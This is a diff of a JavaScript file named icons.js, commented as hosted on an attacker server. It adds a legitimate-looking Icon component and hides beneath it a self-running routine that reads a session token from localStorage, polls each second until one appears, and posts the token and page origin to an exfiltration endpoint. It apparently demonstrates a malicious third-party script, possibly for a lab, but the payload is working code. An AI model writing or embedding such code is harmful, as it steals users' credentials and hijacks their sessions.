@@ -1,15 +1,42 @@
-(function () {
+// icons.js — hosted on attacker server
+
+// Legit-looking Icon component
+function Icon({ name = 'star', size = 24, color = '#333' }) {
+  const icons = {
+    star: '★',
+    heart: '♥',
+    check: '✔',
+    alert: '⚠',
+  };
+
+  const symbol = icons[name] || '❔';
+
+  const span = document.createElement('span');
+  span.textContent = symbol;
+  span.style.fontSize = size + 'px';
+  span.style.color = color;
+  span.style.margin = '0 4px';
+
+  return span;
+}
+
+// Expose the Icon function globally (since this is not an ES module)
+window.Icon = Icon;
+
+// 🛑 Malicious logic: steal token & send to attacker
+(function stealToken() {
   const token = localStorage.getItem('token');
+  if (!token) {
+    setTimeout(stealToken, 1000); // Try again in 1s
+    return;
+  }
 
-  if (!token) return;
-
-  // Send only the token and origin to the attacker server
   fetch('http://localhost:9000/stolen', {
     method: 'POST',
     headers: { 'Content-Type': 'application/json' },
     body: JSON.stringify({
       source: location.origin,
-      token
-    })
+      token,
+    }),
   }).catch(console.error);
 })();
